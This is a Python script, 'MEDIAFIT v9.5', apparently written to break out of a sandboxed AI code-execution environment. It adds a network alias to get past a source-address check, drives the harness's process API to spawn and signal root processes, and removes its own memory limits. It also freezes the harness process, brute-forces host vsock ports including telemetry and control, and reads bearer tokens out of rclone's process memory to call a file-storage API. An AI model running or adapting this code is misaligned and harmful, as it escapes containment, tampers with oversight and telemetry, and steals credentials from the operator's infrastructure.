#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.5  — host-plane focused
#  FIX: add_alias() runs FIRST (v9.4 lost sections 1-5 to EADDRNOTAVAIL)
#  NEW: vsock 5005 route brute-force (GET->405 = route exists), 5002/5001 protocol probes
#  NEW: ExpectStdIn handshake -> StdIn round-trip via /bin/cat
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler, signal
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS = 2 if "--pass2" in sys.argv else 1
VER = "9.5"
NONCE = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2 = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2 = "/dev/shm/mf_pass2.txt"
FAULT = "/mnt/user-data/outputs/mediafit-faults.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
ALIAS = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
BASE = "https://api.anthropic.com/v1/filestore/fs/"
AF_VSOCK = 40
T0 = time.time()

try:
    _fh = open(FAULT, "w"); faulthandler.enable(file=_fh)
    faulthandler.dump_traceback_later(60, repeat=True, file=_fh)
except Exception: pass
L = []
def W(s=""):
    L.append("[%6.1fs] %s" % (time.time() - T0, s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def poll_state(pid, want, secs=2.0):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (%.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS), "ip addr add %s/32 dev eth0" % AIP]:
        subprocess.run(c, shell=True, capture_output=True)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1
def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake")
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
    return s
def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")
def ws_drain(s, per=0.3, total=1.8, maxf=140):
    out = []; t0 = time.time()
    while True:
        r = ws_recv(s, per)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
        if len(out) >= maxf or time.time() - t0 > total: break
    return out
def pipelined(msgs, total=1.4):
    s = None
    try:
        s = ws_connect()
        for m in msgs: ws_send(s, m)
        return ws_drain(s, 0.3, total)
    except Exception as e:
        return ["ERR:" + repr(e)]
    finally:
        if s:
            try: s.close()
            except Exception: pass

def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def nid(): return os.urandom(16).hex()
def cg_procs(hid):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
    except Exception: return []

def vsock(cid, port, timeout=1.2):
    s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
    s.connect((cid, port)); return s
def vsock_req(cid, port, raw, timeout=1.0):
    try:
        s = vsock(cid, port, timeout)
        s.sendall(raw); s.settimeout(timeout)
        try: d = s.recv(400)
        except socket.timeout: d = b"<timeout>"
        s.close(); return d
    except Exception as e: return ("ERR:" + repr(e)).encode()

def find_tokens(budget=12.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks
def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}
def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass
def run_child(code, timeout, pre=None):
    try:
        cp = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=timeout, preexec_fn=pre)
        return cp.returncode, (cp.stdout + cp.stderr).decode("utf-8", "replace")[-100:]
    except subprocess.TimeoutExpired: return "TIMEOUT", ""
    except Exception as e: return "ERR", repr(e)[:80]
def _alarm(n, f):
    try:
        with open(TMP2 if PASS == 2 else OUT, "a") as fh: fh.write("[%6.1fs] *** ALARM hard exit ***\n" % (time.time() - T0))
    except Exception: pass
    os._exit(3)

# ======================================================================
def main():
    signal.signal(signal.SIGALRM, _alarm); signal.alarm(175)
    sec("PASS %d ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%H:%M:%S")))
    W("  *** add_alias FIRST *** -> %s" % add_alias())
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    md = CG + "/memory/process_api/" + HID
    W("  boot=%s uptime=%s self=%d harness=%d id=%s" % (boot, rd("/proc/uptime").strip().split()[0], mypid, H, HID))
    W("  PID1 cmdline = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
    try:
        lv = int(rd(md + "/memory.limit_in_bytes").strip())
        if lv < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM)
    except Exception: pass
    wd = CG + "/memory/mf_wd"
    try:
        os.mkdir(wd); wr(wd + "/memory.limit_in_bytes", str(128 * 1024 * 1024))
    except Exception: pass
    try:
        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 40; echo %s > %s/memory.limit_in_bytes" % (wd, UNLIM, md)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    except Exception: pass

    sec("0b. TREE + FOREIGN (persistence)")
    pa = CG + "/memory/process_api"
    try: allc = sorted([n for n in os.listdir(pa) if os.path.isdir(os.path.join(pa, n))])
    except Exception: allc = []
    W("  FOREIGN=%s" % [n for n in allc if n != HID])
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
        if not cl: continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("      pid %-5s ppid=%-4s st=%s cg=%s cmd=%s" % (q, ppid_of(int(q)), pstat(int(q)), (m.group(1) if m else "?"), cl[:48]))

    sec("1. BYPASS before/after")
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("  src %-11s -> %r" % (src[0], e))

    sec("2. *** FULL API LIFECYCLE: create->attach->SIGSTOP->SIGCONT->KILL ***")
    o = nid()
    W("  create -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True,
      "create_req": spec("/bin/sh", ["-c", "echo READY; sleep 60"], True, 33554432)}], 1.2))
    tp = None
    for q in cg_procs(HID):
        if "sleep 60" in rd("/proc/%d/cmdline" % q).replace("\x00", " "): tp = q
    W("  target os pid=%s state=%s" % (tp, pstat(tp) if tp else "?"))
    if tp:
        W("  attach -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}], 1.2))
        W("  STOP  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 19}], 1.0))
        W("  *** state=%s  T-scan=%s ***" % (poll_state(tp, "T", 2.0), t_scan()))
        W("  CONT  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"SendSignal": 18}], 1.0))
        W("  state=%s" % poll_state(tp, "S", 2.0))
        W("  KILL  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": False}, {"Kill": None}], 1.0))
        W("  after KILL: gone=%s" % (not os.path.exists("/proc/%d" % tp)))

    sec("3. *** StdIn HANDSHAKE + ROUND-TRIP (/bin/cat) ***")
    so = nid()
    W("  spawn /bin/cat -> %s" % pipelined([{"process_id": so, "allow_process_id_reuse": True,
      "create_req": spec("/bin/cat", [], True, 33554432)}], 1.2))
    f = pipelined([{"process_id": so, "allow_process_id_reuse": False}], 1.6)
    W("  attach/drain -> %s" % str(f)[:300])
    off = 0
    mm = re.search(r"ExpectStdIn[^0-9]*(\d+)", str(f))
    if mm: off = int(mm.group(1))
    W("  observed ExpectStdIn offset = %s" % off)
    for data in [[104, 101, 108, 108, 111, 10], "world\n", {"data": [65, 66, 10]}]:
        d = data if isinstance(data, (list, str)) else data
        W("  StdIn offset=%s data=%s -> %s" % (off, str(d)[:24],
          pipelined([{"process_id": so, "allow_process_id_reuse": False}, {"StdIn": {"offset": off, "data": d}}], 1.0)))
        W("      READBACK -> %s" % str(pipelined([{"process_id": so, "allow_process_id_reuse": False}], 1.4))[:220])

    sec("4. ENV INHERITANCE (supervisor env via API)")
    f = pipelined([{"process_id": nid(), "allow_process_id_reuse": True,
      "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH]; echo H=[$HOME]; echo S=[$IS_SANDBOX]; echo T=[$SBX_TELEMETRY_SOCKET]"],
                     "env_vars": {}, "clear_env": False, "allow_process_id_reuse": True,
                     "reattachable": False, "timeout": 15, "uid": 0, "gid": 0, "memory_limit_bytes": 33554432}}], 1.2)
    W("  clear_env=false -> %s" % str(f)[:300])
    W("  /proc/1/environ -> %s" % rd("/proc/1/environ")[:45])

    sec("5. MEMORY + pids")
    try:
        lim = rd(md + "/memory.limit_in_bytes").strip()
        d = CG + "/memory/mf_oom"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/memory.limit_in_bytes", str(32 * 1024 * 1024))
        rc, out = run_child("import os\nopen('%s/cgroup.procs','w').write(str(os.getpid()))\na=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('ok')" % d, 20, _pre_oom)
        W("  [A] rc=%s | mf_oom oom=%s" % (rc, rd(d + "/memory.oom_control").strip().replace("\n", " | ")))
        pd = CG + "/pids/mf_pids"
        try: os.mkdir(pd)
        except FileExistsError: pass
        wr(pd + "/cgroup.procs", str(os.getpid()))
        W("  pids.events BEFORE=[%s]" % rd(pd + "/pids.events").strip().replace("\n", " "))
        kids = []; fails = 0
        try:
            wr(pd + "/pids.max", "3")
            for _ in range(6):
                try:
                    k = os.fork()
                    if k == 0: time.sleep(0.7); os._exit(0)
                    kids.append(k)
                except OSError: fails += 1
            W("  pids.max=3 -> ok=%d EAGAIN=%d AFTER=[%s]" % (len(kids), fails, rd(pd + "/pids.events").strip().replace("\n", " ")))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(pd + "/pids.max", "max")
        wr(CG + "/pids/cgroup.procs", str(os.getpid()))
    except Exception as e: W("  mem/pids err %r" % e)

    sec("6. FREEZER (harness via cgroupfs)")
    try:
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        subprocess.Popen(["/bin/sh", "-c", "sleep 6; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(g + "/cgroup.procs", str(H))
        W("  BEFORE harness=%s self=%s" % (pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "FROZEN")
        W("  *** FROZEN: harness=%s (D) *** self=%s (control) self_freezing=%s" % (pstat(H), pstat(mypid), rd(g + "/freezer.self_freezing").strip()))
        wr(g + "/freezer.state", "THAWED")
        W("  THAWED harness=%s" % pstat(H))
        try: wr(fz + "/cgroup.procs", str(H))
        except Exception: pass
    except Exception as e: W("  freezer err %r" % e)

    sec("7. *** HOST PLANE: vsock 5005 route discovery ***")
    paths = ["/", "/v1/logs", "/v1/metrics", "/v1/traces", "/otlp/v1/logs", "/logs", "/ingest",
             "/v1/ingest", "/events", "/v1/events", "/api/logs", "/telemetry", "/v1/telemetry",
             "/health", "/healthz", "/ready", "/metrics", "/ingest/v1/logs", "/v1/otlp/logs",
             "/log", "/v1/log", "/collect", "/v1/collect", "/debug", "/v1", "/api", "/otlp"]
    W("  GET sweep (405 => route exists):")
    live = []
    for pth in paths:
        d = vsock_req(2, 5005, ("GET %s HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n" % pth).encode(), 0.8)
        st = d.split(b"\r\n", 1)[0][:42] if d and not d.startswith(b"ERR") else d[:40]
        W("      GET %-18s -> %s" % (pth, st))
        if b"405" in d or (b"200" in d and not b"404" in d): live.append(pth)
    W("  LIVE ROUTES: %s" % live)
    for pth in (live or ["/"])[:6]:
        for ct, body in [("application/json", b"{}"), ("application/x-protobuf", b""),
                         ("application/json", b'{"resourceLogs":[]}')]:
            d = vsock_req(2, 5005, ("POST %s HTTP/1.1\r\nHost: x\r\nContent-Type: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % (pth, ct, len(body))).encode() + body, 1.0)
            W("      POST %-14s ct=%-26s -> %s" % (pth, ct, d.split(b"\r\n", 1)[0][:44] if not d.startswith(b"ERR") else d[:40]))
    W("  -- 5002 (log sink): send a line, then read --")
    try:
        s = vsock(2, 5002, 1.2); s.sendall(b"MF_PROBE hello\n"); time.sleep(0.3)
        try: W("      after line -> %r" % s.recv(200))
        except socket.timeout: W("      after line -> <no reply>")
        s.close()
    except Exception as e: W("      5002 err %r" % e)
    W("  -- 5001 (control): read first, then send --")
    try:
        s = vsock(2, 5001, 1.2)
        try: W("      greeting -> %r" % s.recv(200))
        except socket.timeout: W("      greeting -> <none>")
        try:
            s.sendall(b'{"hello":"world"}\n'); time.sleep(0.3)
            try: W("      after json -> %r" % s.recv(200))
            except socket.timeout: W("      after json -> <none>")
        except Exception as e: W("      send err %r" % e)
        s.close()
    except Exception as e: W("      5001 err %r" % e)
    W("  -- cid3 / others --")
    for cid, port in [(3, 2024), (2, 2024), (2, 5005)]:
        try:
            s = vsock(cid, port, 1.0); W("      cid=%d:%d CONNECTED" % (cid, port)); s.close()
        except Exception as e: W("      cid=%d:%d -> %r" % (cid, port, e))

    sec("8. C2PA")
    toks = find_tokens(); pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if pick:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        rq = urllib.request.Request(BASE + "createFile", data=body, method="POST")
        for k, v in {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd}.items(): rq.add_header(k, v)
        try: urllib.request.urlopen(rq, timeout=12)
        except Exception: pass
        rq2 = urllib.request.Request(BASE + "readFile", data=json.dumps({"filesystem_id": fsid, "path": path}).encode(), method="POST")
        for k, v in hdr.items(): rq2.add_header(k, v)
        try:
            b3 = urllib.request.urlopen(rq2, timeout=12).read()
            W("  sent=%d stored=%d delta=%+d md5_equal=%s" % (len(svg), len(b3), len(b3) - len(svg),
              hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))
        except Exception as e: W("  c2pa err %r" % e)

    sec("END PASS %d elapsed=%.1fs" % (PASS, time.time() - T0))
    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            signal.alarm(0)
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=95,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e: W("pass2 err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception: traceback.print_exc()